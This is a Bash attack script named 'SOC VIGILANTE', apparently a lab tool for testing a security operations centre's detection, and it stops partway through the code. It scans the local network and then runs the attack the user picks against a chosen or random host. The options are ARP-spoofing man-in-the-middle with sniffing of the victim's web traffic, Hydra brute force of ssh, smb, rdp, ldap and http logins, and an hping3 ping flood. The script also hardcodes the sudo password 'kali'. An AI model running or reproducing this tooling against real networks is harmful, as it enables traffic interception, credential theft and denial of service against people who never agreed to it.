#!/bin/bash

#This Function check if all necessary packages are installed to be used later on.
function PRECHECKER()
{
	#arp-scan is used to scan for endpoints that are up in the Local Area Network (LAN)
	function installarpscan()
	{
	if command -v arp-scan >/dev/null
	then 
		echo '[+] arp-scan is installed'
		return
	else
		echo '[-] arp-scan NOT installed, installing...'
		echo kali | sudo -S apt-get install arp-scan -y 2>/dev/null
	fi
	installarpscan
	}
	installarpscan

	#nmap is used to scan for open ports of target IP address
	#It can also be used to scan for endpoints that are connected to the LAN
	function installnmap()
	{
	if command -v nmap >/dev/null
	then 
		echo '[+] nmap is installed'
		return
	else
		echo '[-] nmap NOT installed, installing...'
		echo kali | sudo -S apt-get install nmap -y 2>/dev/null
	fi
	installnmap
	}
	installnmap

	#arpspoof is used to spoof host's mac address in order to place itself as a relay between 2 devices to collect information
	function installarpspoof()
	{
	if command -v arpspoof >/dev/null
	then 
		echo "[+] arpspoof is installed"
		return
	else
		echo "[-] arpspoof NOT installed, installing..."
		echo kali | sudo -S apt-get install arpspoof -y
	fi
	installarpspoof
	}
	installarpspoof
	
	#urlsnarf is used to listen to the targets web activities
	function installurlsnarf()
	{
	if command -v urlsnarf >/dev/null
	then 
		echo "[+] urlsnarf is installed"
		return
	else
		echo "[-] urlsnarf NOT installed, installing..."
		echo kali | sudo -S apt-get install urlsnarf -y
	fi
	installurlsnarf
	}
	installurlsnarf
	
	#hping3 is used to flood the target with ICMP with intend to overwhelm the target
	function installhping3()
	{
	if command -v hping3 >/dev/null
	then 
		echo "[+] hping3 is installed"
		return
	else
		echo "[-] hping3 NOT installed, installing..."
		echo kali | sudo -S apt-get install hping3 -y
	fi
	installhping3
	}
	installhping3
	
	#LOGDIR checks if the log for our script exists, if not it will create one 
	function LOGDIR()
	{
	if test -f /var/log/socchecker.log
	then 
		echo "[+] '/var/log/soccheck.log' ready for logging"
		return
	else
		echo -e "\n[-] NO log found. Creating in process.."
		echo kali | sudo -S touch /var/log/socchecker.log 2>/dev/null
		echo kali | sudo -S chmod 666 /var/log/socchecker.log 2>/dev/null
	fi
	LOGDIR
	}
	LOGDIR
	
	#createusrlist check for any pre-existing username list to use, if not it will copy from nmap most common usernames
	function createusrlist()
	{
	if test -f /home/kali/Documents/usernames.lst
	then 
		echo "[+] usernames.lst ready for Hydra"
		return
	else 
		cp /usr/share/nmap/nselib/data/usernames.lst /home/kali/Documents/usernames.lst
		return
	fi
	createusrlist
	}
	createusrlist
	
	#createpwdlist check for any pre-existing password list, if not it will copy the top 100 most common password to use
	function createpwdlist()
	{
	if test -f /home/kali/Documents/passworded.lst
	then 
		echo "[+] passworded.lst ready for Hydra"
		return
	else 
		cat /usr/share/john/password.lst | tail -n 3545 | head -n 100 > /home/kali/Documents/passworded.lst
		return
	fi
	createpwdlist
	}
	createpwdlist
}
PRECHECKER


figlet SOC VIGILANTE

#scanning LAN IP to attack
echo "Scanning available endpoints.."
echo "IP addresses discovered in your LAN:"
echo kali | sudo -S arp-scan --localnet --numeric --quiet --ignoredups 2>/dev/null | grep -v IPv4 | grep -v Starting | grep -Eo '([0-9]{1,3}[/.]){3}[0-9]{1,3}' > temp_ipatklist 
cat temp_ipatklist
echo Random >> temp_ipatklist

#store gateway/router IP as variable
gateip=$(route -n | grep UG | awk '{print $2}')

#Main Function of the Script - Choosing Attack vectors and Target IP Address
function atkmcq()
{
##Attack Options to choose
echo "
Which attack you wish to execute? choose number.
1 MITM ~ Man-in-the-Middle  (arp-poisoning to trick endpoint and sniff traffic)
2 Hydra  (Brute force with list files containing usernames and passwords)
3 Ping Flood  (flooding endpoint with pings in attempt to deny service or freeze endpoint)
4 Random  (any of the above)
"
read -r -n 1 atkmode
if [[ "$atkmode" =~ [[:digit:]] && "$atkmode" -gt 0 && "$atkmode" -lt 4 ]]
then

	case $atkmode in

######MITM ATTACK - choose IP to attack
	1)
	echo -e "\nYou have picked MITM."
	function CHOOSEIP_MITM()
	{
	#Option Prompt: User can choose list of IP to attack or Press 'x' to exit script or 'o' to choose another attack
	echo -e "\nWhich IP do you wish to attack? choose number. \nPress 'x' to exit program. \nPress 'o' to choose another option."
	cat -n temp_ipatklist
	LineNum=$(cat temp_ipatklist | wc -l)
	read -r -n 1 IPtarget
	#if user choose Random attack, if will randomise option using 'shuf' command and feed input into CHOOSEIP_MITM function
	if 	[[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" == "$LineNum" ]]
		then
		echo "You have chosen Random IP to attack"
		shuf -i "1-$LineNum" -n 1 | CHOOSEIP_MITM
		return
	#if user choose attacks other than Random, if will save the ip into a temporary file and use on later part of other function in MITM
		elif [[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" -gt 0 && "$IPtarget" -lt "$LineNum" ]]
		then
		echo $(cat temp_ipatklist | awk NR==$IPtarget) > temp_shuffleip
		echo -e "\nyou have chosen to use 'MITM' at $(cat temp_ipatklist | awk NR==$IPtarget)"
		echo "$(date) Launched 'MITM' at $(cat temp_ipatklist | awk NR==$IPtarget)" >> /var/log/socchecker.log
		return
	#Press 'o' to choose other attack vectors if user changes his mind or press wrong option
	elif
		[[ "$IPtarget" == "o" ]]
		then
		atkmcq
	#Press 'x' to exit the whole script
	elif
		[[ "$IPtarget" == "x" ]]
		then
		exit
	#If user input an Invalid input (not 1,2,3..,o,x), it will prompt again for valid option
	else
	echo -e "\nINVALID KEY. Choose a valid IP Address"
	CHOOSEIP_MITM
	fi
	CHOOSEIP_MITM
	}
	CHOOSEIP_MITM

	##MITM - Configurations
	#delete the target IP mac address in the ARP table to update with our spoofed IP and MAC address
	echo "kali" | sudo -S arp -d $(cat temp_ipatklist | awk NR==$IPtarget) 2>/dev/null
	#configuring ip_forward file so that targetted user will be able to relay through us
	echo "kali" | sudo -S echo 1 > ip_forward 2>/dev/null
	echo "kali" | sudo -S cp ip_forward /proc/sys/net/ipv4/ip_forward 2>/dev/null
	rm ip_forward
	sleep 2
	
	#SNIFFING check if user wants to log the target web activities and start MITM attack
	function SNIFFING()
	{
	echo "Do you want to sniff and log the victim web activities? (y/n)"
	read -r -n 1 sniffans
	
	if [ $sniffans == "y" ]
		then
		echo -e "\nSniffed informationed will be stored in /home/kali/Documents/sniffed_web.txt"
		echo ">>>  press 'k' to stop MITM  <<<"
		sleep 3
		echo "poisoning and sniffing in process.."
	#logs target web activities using 'urlsnarf' command
		sudo urlsnarf -i eth0 >> /home/kali/Documents/sniffed_web.txt &	
	#starting MITM by using 'arpspoof' command
		echo "kali" | sudo -S arpspoof -t $(cat temp_shuffleip) $gateip &
		echo "kali" | sudo -S arpspoof -t $gateip $(cat temp_shuffleip) &
		
	#Press 'k' to stop arp spoofing/poisoning & deletes created temporary file
		function KILLPROC_MITM()
		{
		echo ">>>  press 'k' to stop  <<<"
		read -r -s -n 1 xkill
			if [ $xkill = "k" ]
				then
				echo "killing MITM.."
				pkill sudo
				rm -rf temp_shuffleip
				sleep 7
				echo -e "press ENTER to return back to command line"
				return	
			else
			echo "INVALID KEY. Press 'k' to stop"
			fi
		KILLPROC_MITM
		}
		KILLPROC_MITM
		return
		
		elif [ $sniffans == "n" ]
		then
		echo -e "\npoisoning in process.."
		echo ">>>  press 'k' to stop  <<<"
		sleep 3
		#starting MITM by using 'arpspoof' command and '&' pushes the process to background
		echo "kali" | sudo -S arpspoof -i eth0 -t $(cat temp_shuffleip) $gateip &
		echo "kali" | sudo -S arpspoof -i eth0 -t $gateip $(cat temp_shuffleip) &
	
	#Press 'k' to stop arp spoofing/poisoning & deletes created temporary file		
		function KILLPROC_MITM()
		{
		echo ">>>  press 'k' to stop  <<<"
		read -r -s -n 1 xkill
			if [[ $xkill == "k" ]]
				then
				echo "killing MITM.."
	#'pkill' kills the background process (arpspoof) that was previously pushed into background
				pkill sudo
	#removes temporary file created
				rm -rf temp_shuffleip
				sleep 7
				echo -e "Completed. Press ENTER to return back to command line"
				return	
			else
	#if any other key input other than 'k' is entered, it will prompt the correct input to kill process
			echo "INVALID KEY. Press 'k' to stop"
			fi
		KILLPROC_MITM
		}
		KILLPROC_MITM
		return
	#If user input an Invalid input (not y,n), it will prompt again for valid option		
	else 
	echo "INVALID KEY. please enter "y" or "n""
	fi

	SNIFFING
	}
	SNIFFING
	
	#after current attack is completed, OTHERATTACK prompt user if he want to continue with another attack
	function OTHERATTACK()
	{
	echo "Do you want you continue another attack? (y/n)" 
	read -r -n 1 oaans	
	#Press 'n' to stop script & deletes created temporary file
	if [ $oaans == "n" ]
		then 
		rm -rf temp_ipatklist
		echo -e "\nHave a good day. Bye Bye."
		exit
	#Press 'y' to continue with another attack
	elif
		[ $oaans == "y" ]
		then atkmcq
	#If user input an Invalid input (not y,n), it will prompt again for valid option
	else
	echo "INVALID KEY. please enter "y" or "n""
	OTHERATTACK
	fi
	}
	OTHERATTACK
	
	return
	;;
	
	
######Hydra Brute Force - choose IP to attack
	2)
	echo -e "\nYou have picked Hydra."
	function CHOOSEIP_BF()
	{
	#Option Prompt: User can choose list of IP to attack or Press 'x' to exit script or 'o' to choose another attack
	echo -e "\nWhich IP do you wish to attack? choose number. \nPress 'x' to exit program. \nPress 'o' to choose another option."
	cat -n temp_ipatklist
	LineNum=$(cat temp_ipatklist | wc -l)
	read -r -n 1 IPtarget
	#if user choose Random attack, if will randomise option using 'shuf' command and feed input into CHOOSEIP_BF function
	if 	[[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" == "$LineNum" ]]
		then
		echo "You have chosen Random IP to attack"
		shuf -i "1-$LineNum" -n 1 | CHOOSEIP_BF
		return
	#if user choose attacks other than Random, if will save the ip into a temporary file and use on later part of other function in Hydra Brute Force
		elif [[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" -gt 0 && "$IPtarget" -lt "$LineNum" ]]
		then
		echo $(cat temp_ipatklist | awk NR==$IPtarget) > temp_shuffleip
		echo -e "\nyou have chosen to use 'Hydra' at $(cat temp_ipatklist | awk NR==$IPtarget)"
		echo "$(date) Launched 'Hydra' at $(cat temp_ipatklist | awk NR==$IPtarget)" >> /var/log/socchecker.log
		return
	#Press 'o' to choose other attack vectors if user changes his mind or press wrong option
	elif
		[[ "$IPtarget" == "o" ]]
		then
		atkmcq
	#Press 'x' to exit the whole script
	elif
		[[ "$IPtarget" == "x" ]]
		then
		exit
	#If user input an Invalid input (not 1,2,3..,o,x), it will prompt again for valid option
	else
	echo -e "\nINVALID KEY. Choose a valid IP Address"
	CHOOSEIP_BF
	fi
	CHOOSEIP_BF
	}
	CHOOSEIP_BF
	
	##Hydra Brute Force attacking
	#SERVICECHECK will check which service is available for brute force and store into a temporary file to be used in later part of Hydra Brute Force
	function SERVICECHECK()
	{
	#removes bfmode.txt if there is existing one to prevent inaccuracy from previous execution
	rm -rf bfmode.txt
	#using nmap to check for available ports and saves into temporary file 'temp_Nmap'
	nmap -sV -Pn $(cat temp_shuffleip) > temp_Nmap
	#if http service is open, if will write into bfmode.txt to give user option to attack the service later on
	if  cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep -w http >/dev/null
		then echo "[+] 'http' available for brute force"
			 echo http-post >> bfmode.txt
		else echo "[-] http Service NOT available for brute force"
	fi
	#if ldap service is open, if will write into bfmode.txt to give user option to attack the service later on
	if cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep ldap >/dev/null
		then echo "[+] 'ldap2' available for brute force"
		echo ldap2 >> bfmode.txt
		else echo "[-] ldap Service NOT available for brute force"
	fi
	#if rdp service is open, if will write into bfmode.txt to give user option to attack the service later on
	if cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep 3389 >/dev/null
		then echo "[+] 'rdp' available for brute force"
		echo rdp >> bfmode.txt
		else echo "[-] rdp Service NOT available for brute force"
	fi
	#if smb service is open, if will write into bfmode.txt to give user option to attack the service later on
	if cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep 445 >/dev/null
		then echo "[+] 'smb' available for brute force"
		echo smb >> bfmode.txt
		else echo "[-] smb Service NOT available for brute force"
	fi
	#if ssh service is open, if will write into bfmode.txt to give user option to attack the service later on
	if cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep ssh >/dev/null
		then echo "[+] 'ssh' available for brute force"
		echo ssh >> bfmode.txt
		else echo "[-] ssh Service NOT available for brute force"
	fi

	}
	SERVICECHECK
	
	#CHOOSEBF allow user to choose the available service to attack called from bfmode.txt
	function CHOOSEBF()
	{
	echo -e "\nchoose your service to brute force? choose number."
	cat -n bfmode.txt
	LineNum_bf=$(cat bfmode.txt | wc -l)
	read -r -n 1 bfmode
	#Prompts user for valid input (eg. 1,2,3..) to attack the chosen service
	if [[ "$bfmode" =~ [[:digit:]] && "bfmode" -gt 0 && "$bfmode" -le "$LineNum_bf" ]]
		then
		echo -e "\nYou have chosen $(cat bfmode.txt | awk NR==$bfmode)"
		echo ">>>  press 'k' to stop  <<<"
		sleep 2
		hydra -L ~/Documents/usernames.lst -P ~/Documents/passworded.lst $(cat temp_shuffleip) $(cat bfmode.txt | awk NR==$bfmode) -vV &
	#Press 'k' to stop brute forcing & deletes created temporary file	
		function KILLPROC()
		{
		echo ">>>  press 'k' to stop  <<<"
		sleep 3
		read -r -s -n 1 xkill
			if [ $xkill = "k" ]
				then
				echo "killing hydra.."
	#'pkill' kills the background process (hydra) that was previously pushed into background
				pkill hydra
	#removes temporary file created
				rm -rf temp_shuffleip
				rm -rf bfmode.txt
				rm -rf temp_Nmap
				sleep 3
				echo -e "press ENTER to return back to command line"
				return	
	#if any other key input other than 'k' is entered, it will prompt the correct input to kill process
			else
			echo "INVALID KEY. Press 'k' to stop"
			fi
		KILLPROC
		}
		KILLPROC	
		
		return
	#If user input an Invalid input (not 1,2,3..) it will prompt again for valid option
	else
	echo -e "\nINVALID KEY. Choose a valid Service"
	CHOOSEBF
	fi
	CHOOSEBF
	}
	CHOOSEBF
	
	#after current attack is completed, OTHERATTACK prompt user if he want to continue with another attack
	function OTHERATTACK()
	{
	echo "do you want you continue another attack? (y/n)" 
	read -r -n 1 oaans
	
	#Press 'n' to stop script & deletes created temporary file
	if [ $oaans == "n" ]
		then 
		rm -rf temp_ipatklist
		echo -e "\nHave a good day. Bye Bye."
		exit
	#Press 'y' to continue with another attack
	elif
		[ $oaans == "y" ]
		then atkmcq
	#If user input an Invalid input (not y,n), it will prompt again for valid option
	else
	echo "INVALID KEY. please enter "y" or "n""
	OTHERATTACK
	fi
	}
	OTHERATTACK
	
	return
	;;
	
	
######Ping Flood - choose IP to attack
	3)
	echo -e "\nYou have picked PING FLOOD."
	function CHOOSEIP_PING()
	{
	#Option Prompt: User can choose list of IP to attack or Press 'x' to exit script or 'o' to choose another attack
	echo -e "\nWhich IP do you wish to attack? choose number. \nPress 'x' to exit program. \nPress 'o' to choose another option."
	cat -n temp_ipatklist
	LineNum=$(cat temp_ipatklist | wc -l)
	read -r -n 1 IPtarget
	#if user choose Random attack, if will randomise option using 'shuf' command and feed input into CHOOSEIP_PING function
	if 	[[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" == "$LineNum" ]]
		then
		echo "You have chosen Random IP to attack"
		shuf -i "1-$LineNum" -n 1 | CHOOSEIP_PING
		return
	#if user choose attacks other than Random, if will save the ip into a temporary file and use on later part of other function in Ping Flood
		elif [[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" -gt 0 && "$IPtarget" -lt "$LineNum" ]]
		then
		echo $(cat temp_ipatklist | awk NR==$IPtarget) > temp_shuffleip
		echo -e "\nyou have chosen to use 'PING FLOOD' at $(cat temp_ipatklist | awk NR==$IPtarget)"
		echo "$(date) Launched 'PING FLOOD' at $(cat temp_ipatklist | awk NR==$IPtarget)" >> /var/log/socchecker.log
		return
	#Press 'o' to choose other attack vectors if user changes his mind or press wrong option
	elif
		[[ "$IPtarget" == "o" ]]
		then
		atkmcq
	#Press 'x' to exit the whole script
	elif
		[[ "$IPtarget" == "x" ]]
		then
		exit
	#If user input an Invalid input (not 1,2,3..,o,x), it will prompt again for valid option
	else
	echo -e "\nINVALID KEY. Choose a valid IP Address"
	CHOOSEIP_PING
	fi

	}
	CHOOSEIP_PING
	
	##Ping Flood attacking
	function PINGFLOOD()
	{
	echo "Press 'k' to stop ping flood"
	sleep 3
	#hping3 is used to flood the target in attempt to freeze the machine or deny its service
	echo kali | sudo -S hping3 -1 --flood $(cat temp_shuffleip) &
	#Press 'k' to stop brute forcing & deletes created temporary file
		function KILLPROC_PINGF()
		{
		echo ">>>  press 'k' to stop  <<<"
		read -r -s -n 1 xkill
			if [ $xkill = "k" ]
				then
				echo "killing PING FLOOD.."
	#'pkill' kills the background process (hping3) that was previously pushed into background
				pkill sudo
	#removes temporary file created
				rm -rf temp_shuffleip
				sleep 3
				echo -e "Completed."
				return
	#if any other key input other than 'k' is entered, it will prompt the correct input to kill process			
			else
			echo "INVALID KEY. Press 'k' to stop"
			KILLPROC_PINGF
			fi
		}
		KILLPROC_PINGF
		return

	}
	PINGFLOOD
	
	#after current attack is completed, OTHERATTACK prompt user if he want to continue with another attack
	function OTHERATTACK()
	{
	echo "Do you want you continue another attack? (y/n)" 
	read -r -n 1 oaans
	
	#Press 'n' to stop script & deletes created temporary file
	if [ $oaans == "n" ]
		then 
		rm -rf temp_ipatklist
		echo -e "\nHave a good day. Bye Bye."
		exit
	#Press 'y' to continue with another attack
	elif
		[ $oaans == "y" ]
		then atkmcq
	#If user input an Invalid input (not y,n), it will prompt again for valid option
	else
	echo "INVALID KEY. please enter "y" or "n""
	OTHERATTACK
	fi
	}
	OTHERATTACK
	
	return
	;;
	esac
	
#IF user chosed attack vector Option - Random, it will execute the below functions, which are exactly the same as above
#below case statement was duplicated because input cannot be piped into the function atkmcq -> read $atkmode
elif [[ "$atkmode" =~ [[:digit:]] && "$atkmode" == 4 ]]
then
atkmode=$(shuf -i 1-3 -n1)

	case $atkmode in

######MITM ATTACK - choose IP to attack
	1)
	echo -e "\nYou have picked MITM."
	function CHOOSEIP_MITM()
	{
	#Option Prompt: User can choose list of IP to attack or Press 'x' to exit script or 'o' to choose another attack
	echo -e "\nWhich IP do you wish to attack? choose number. \nPress 'x' to exit program. \nPress 'o' to choose another option."
	cat -n temp_ipatklist
	LineNum=$(cat temp_ipatklist | wc -l)
	read -r -n 1 IPtarget
	#if user choose Random attack, if will randomise option using 'shuf' command and feed input into CHOOSEIP_MITM function
	if 	[[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" == "$LineNum" ]]
		then
		echo "You have chosen Random IP to attack"
		shuf -i "1-$LineNum" -n 1 | CHOOSEIP_MITM
		return
	#if user choose attacks other than Random, if will save the ip into a temporary file and use on later part of other function in MITM
		elif [[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" -gt 0 && "$IPtarget" -lt "$LineNum" ]]
		then
		echo $(cat temp_ipatklist | awk NR==$IPtarget) > temp_shuffleip
		echo -e "\nyou have chosen to use 'MITM' at $(cat temp_ipatklist | awk NR==$IPtarget)"
		echo "$(date) Launched 'MITM' at $(cat temp_ipatklist | awk NR==$IPtarget)" >> /var/log/socchecker.log
		return
	#Press 'o' to choose other attack vectors if user changes his mind or press wrong option
	elif
		[[ "$IPtarget" == "o" ]]
		then
		atkmcq
	#Press 'x' to exit the whole script
	elif
		[[ "$IPtarget" == "x" ]]
		then
		exit
	#If user input an Invalid input (not 1,2,3..,o,x), it will prompt again for valid option
	else
	echo -e "\nINVALID KEY. Choose a valid IP Address"
	CHOOSEIP_MITM
	fi
	CHOOSEIP_MITM
	}
	CHOOSEIP_MITM

	##MITM - Configurations
	#delete the target IP mac address in the ARP table to update with our spoofed IP and MAC address
	echo "kali" | sudo -S arp -d $(cat temp_ipatklist | awk NR==$IPtarget) 2>/dev/null
	#configuring ip_forward file so that targetted user will be able to relay through us
	echo "kali" | sudo -S echo 1 > ip_forward 2>/dev/null
	echo "kali" | sudo -S cp ip_forward /proc/sys/net/ipv4/ip_forward 2>/dev/null
	rm ip_forward
	sleep 2
	
	#SNIFFING check if user wants to log the target web activities and start MITM attack
	function SNIFFING()
	{
	echo "Do you want to sniff and log the victim web activities? (y/n)"
	read -r -n 1 sniffans
	
	if [ $sniffans == "y" ]
		then
		echo -e "\nSniffed informationed will be stored in /home/kali/Documents/sniffed_web.txt"
		echo ">>>  press 'k' to stop MITM  <<<"
		sleep 3
		echo "poisoning and sniffing in process.."
	#logs target web activities using 'urlsnarf' command
		sudo urlsnarf -i eth0 >> /home/kali/Documents/sniffed_web.txt &	
	#starting MITM by using 'arpspoof' command
		echo "kali" | sudo -S arpspoof -t $(cat temp_shuffleip) $gateip &
		echo "kali" | sudo -S arpspoof -t $gateip $(cat temp_shuffleip) &
		
	#Press 'k' to stop arp spoofing/poisoning & deletes created temporary file
		function KILLPROC_MITM()
		{
		echo ">>>  press 'k' to stop  <<<"
		read -r -s -n 1 xkill
			if [ $xkill = "k" ]
				then
				echo "killing MITM.."
				pkill sudo
				rm -rf temp_shuffleip
				sleep 7
				echo -e "press ENTER to return back to command line"
				return	
			else
			echo "INVALID KEY. Press 'k' to stop"
			fi
		KILLPROC_MITM
		}
		KILLPROC_MITM
		return
		
		elif [ $sniffans == "n" ]
		then
		echo -e "\npoisoning in process.."
		echo ">>>  press 'k' to stop  <<<"
		sleep 3
		#starting MITM by using 'arpspoof' command and '&' pushes the process to background
		echo "kali" | sudo -S arpspoof -i eth0 -t $(cat temp_shuffleip) $gateip &
		echo "kali" | sudo -S arpspoof -i eth0 -t $gateip $(cat temp_shuffleip) &
	
	#Press 'k' to stop arp spoofing/poisoning & deletes created temporary file		
		function KILLPROC_MITM()
		{
		echo ">>>  press 'k' to stop  <<<"
		read -r -s -n 1 xkill
			if [[ $xkill == "k" ]]
				then
				echo "killing MITM.."
	#'pkill' kills the background process (arpspoof) that was previously pushed into background
				pkill sudo
	#removes temporary file created
				rm -rf temp_shuffleip
				sleep 7
				echo -e "Completed. Press ENTER to return back to command line"
				return	
			else
	#if any other key input other than 'k' is entered, it will prompt the correct input to kill process
			echo "INVALID KEY. Press 'k' to stop"
			fi
		KILLPROC_MITM
		}
		KILLPROC_MITM
		return
	#If user input an Invalid input (not y,n), it will prompt again for valid option		
	else 
	echo "INVALID KEY. please enter "y" or "n""
	fi

	SNIFFING
	}
	SNIFFING
	
	#after current attack is completed, OTHERATTACK prompt user if he want to continue with another attack
	function OTHERATTACK()
	{
	echo "Do you want you continue another attack? (y/n)" 
	read -r -n 1 oaans	
	#Press 'n' to stop script & deletes created temporary file
	if [ $oaans == "n" ]
		then 
		rm -rf temp_ipatklist
		echo -e "\nHave a good day. Bye Bye."
		exit
	#Press 'y' to continue with another attack
	elif
		[ $oaans == "y" ]
		then atkmcq
	#If user input an Invalid input (not y,n), it will prompt again for valid option
	else
	echo "INVALID KEY. please enter "y" or "n""
	OTHERATTACK
	fi
	}
	OTHERATTACK
	
	return
	;;
	
	
######Hydra Brute Force - choose IP to attack
	2)
	echo -e "\nYou have picked Hydra."
	function CHOOSEIP_BF()
	{
	#Option Prompt: User can choose list of IP to attack or Press 'x' to exit script or 'o' to choose another attack
	echo -e "\nWhich IP do you wish to attack? choose number. \nPress 'x' to exit program. \nPress 'o' to choose another option."
	cat -n temp_ipatklist
	LineNum=$(cat temp_ipatklist | wc -l)
	read -r -n 1 IPtarget
	#if user choose Random attack, if will randomise option using 'shuf' command and feed input into CHOOSEIP_BF function
	if 	[[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" == "$LineNum" ]]
		then
		echo "You have chosen Random IP to attack"
		shuf -i "1-$LineNum" -n 1 | CHOOSEIP_BF
		return
	#if user choose attacks other than Random, if will save the ip into a temporary file and use on later part of other function in Hydra Brute Force
		elif [[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" -gt 0 && "$IPtarget" -lt "$LineNum" ]]
		then
		echo $(cat temp_ipatklist | awk NR==$IPtarget) > temp_shuffleip
		echo -e "\nyou have chosen to use 'Hydra' at $(cat temp_ipatklist | awk NR==$IPtarget)"
		echo "$(date) Launched 'Hydra' at $(cat temp_ipatklist | awk NR==$IPtarget)" >> /var/log/socchecker.log
		return
	#Press 'o' to choose other attack vectors if user changes his mind or press wrong option
	elif
		[[ "$IPtarget" == "o" ]]
		then
		atkmcq
	#Press 'x' to exit the whole script
	elif
		[[ "$IPtarget" == "x" ]]
		then
		exit
	#If user input an Invalid input (not 1,2,3..,o,x), it will prompt again for valid option
	else
	echo -e "\nINVALID KEY. Choose a valid IP Address"
	CHOOSEIP_BF
	fi
	CHOOSEIP_BF
	}
	CHOOSEIP_BF
	
	##Hydra Brute Force attacking
	#SERVICECHECK will check which service is available for brute force and store into a temporary file to be used in later part of Hydra Brute Force
	function SERVICECHECK()
	{
	#removes bfmode.txt if there is existing one to prevent inaccuracy from previous execution
	rm -rf bfmode.txt
	#using nmap to check for available ports and saves into temporary file 'temp_Nmap'
	nmap -sV -Pn $(cat temp_shuffleip) > temp_Nmap
	#if http service is open, if will write into bfmode.txt to give user option to attack the service later on
	if  cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep -w http >/dev/null
		then echo "[+] 'http' available for brute force"
			 echo http-post >> bfmode.txt
		else echo "[-] http Service NOT available for brute force"
	fi
	#if ldap service is open, if will write into bfmode.txt to give user option to attack the service later on
	if cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep ldap >/dev/null
		then echo "[+] 'ldap2' available for brute force"
		echo ldap2 >> bfmode.txt
		else echo "[-] ldap Service NOT available for brute force"
	fi
	#if rdp service is open, if will write into bfmode.txt to give user option to attack the service later on
	if cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep 3389 >/dev/null
		then echo "[+] 'rdp' available for brute force"
		echo rdp >> bfmode.txt
		else echo "[-] rdp Service NOT available for brute force"
	fi
	#if smb service is open, if will write into bfmode.txt to give user option to attack the service later on
	if cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep 445 >/dev/null
		then echo "[+] 'smb' available for brute force"
		echo smb >> bfmode.txt
		else echo "[-] smb Service NOT available for brute force"
	fi
	#if ssh service is open, if will write into bfmode.txt to give user option to attack the service later on
	if cat temp_Nmap | grep -vi nmap | grep -v ncacn | grep ssh >/dev/null
		then echo "[+] 'ssh' available for brute force"
		echo ssh >> bfmode.txt
		else echo "[-] ssh Service NOT available for brute force"
	fi

	}
	SERVICECHECK
	
	#CHOOSEBF allow user to choose the available service to attack called from bfmode.txt
	function CHOOSEBF()
	{
	echo -e "\nchoose your service to brute force? choose number."
	cat -n bfmode.txt
	LineNum_bf=$(cat bfmode.txt | wc -l)
	read -r -n 1 bfmode
	#Prompts user for valid input (eg. 1,2,3..) to attack the chosen service
	if [[ "$bfmode" =~ [[:digit:]] && "bfmode" -gt 0 && "$bfmode" -le "$LineNum_bf" ]]
		then
		echo -e "\nYou have chosen $(cat bfmode.txt | awk NR==$bfmode)"
		echo ">>>  press 'k' to stop  <<<"
		sleep 2
		hydra -L ~/Documents/usernames.lst -P ~/Documents/passworded.lst $(cat temp_shuffleip) $(cat bfmode.txt | awk NR==$bfmode) -vV &
	#Press 'k' to stop brute forcing & deletes created temporary file	
		function KILLPROC()
		{
		echo ">>>  press 'k' to stop  <<<"
		sleep 3
		read -r -s -n 1 xkill
			if [ $xkill = "k" ]
				then
				echo "killing hydra.."
	#'pkill' kills the background process (hydra) that was previously pushed into background
				pkill hydra
	#removes temporary file created
				rm -rf temp_shuffleip
				rm -rf bfmode.txt
				rm -rf temp_Nmap
				sleep 3
				echo -e "press ENTER to return back to command line"
				return	
	#if any other key input other than 'k' is entered, it will prompt the correct input to kill process
			else
			echo "INVALID KEY. Press 'k' to stop"
			fi
		KILLPROC
		}
		KILLPROC	
		
		return
	#If user input an Invalid input (not 1,2,3..) it will prompt again for valid option
	else
	echo -e "\nINVALID KEY. Choose a valid Service"
	CHOOSEBF
	fi
	CHOOSEBF
	}
	CHOOSEBF
	
	#after current attack is completed, OTHERATTACK prompt user if he want to continue with another attack
	function OTHERATTACK()
	{
	echo "do you want you continue another attack? (y/n)" 
	read -r -n 1 oaans
	
	#Press 'n' to stop script & deletes created temporary file
	if [ $oaans == "n" ]
		then 
		rm -rf temp_ipatklist
		echo -e "\nHave a good day. Bye Bye."
		exit
	#Press 'y' to continue with another attack
	elif
		[ $oaans == "y" ]
		then atkmcq
	#If user input an Invalid input (not y,n), it will prompt again for valid option
	else
	echo "INVALID KEY. please enter "y" or "n""
	OTHERATTACK
	fi
	}
	OTHERATTACK
	
	return
	;;
	
	
######Ping Flood - choose IP to attack
	3)
	echo -e "\nYou have picked PING FLOOD."
	function CHOOSEIP_PING()
	{
	#Option Prompt: User can choose list of IP to attack or Press 'x' to exit script or 'o' to choose another attack
	echo -e "\nWhich IP do you wish to attack? choose number. \nPress 'x' to exit program. \nPress 'o' to choose another option."
	cat -n temp_ipatklist
	LineNum=$(cat temp_ipatklist | wc -l)
	read -r -n 1 IPtarget
	#if user choose Random attack, if will randomise option using 'shuf' command and feed input into CHOOSEIP_PING function
	if 	[[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" == "$LineNum" ]]
		then
		echo "You have chosen Random IP to attack"
		shuf -i "1-$LineNum" -n 1 | CHOOSEIP_PING
		return
	#if user choose attacks other than Random, if will save the ip into a temporary file and use on later part of other function in Ping Flood
		elif [[ "$IPtarget" =~ [[:digit:]] && "$IPtarget" -gt 0 && "$IPtarget" -lt "$LineNum" ]]
		then
		echo $(cat temp_ipatklist | awk NR==$IPtarget) > temp_shuffleip
		echo -e "\nyou have chosen to use 'PING FLOOD' at $(cat temp_ipatklist | awk NR==$IPtarget)"
		echo "$(date) Launched 'PING FLOOD' at $(cat temp_ipatklist | awk NR==$IPtarget)" >> /var/log/socchecker.log
		return
	#Press 'o' to choose other attack vectors if user changes his mind or press wrong option
	elif
		[[ "$IPtarget" == "o" ]]
		then
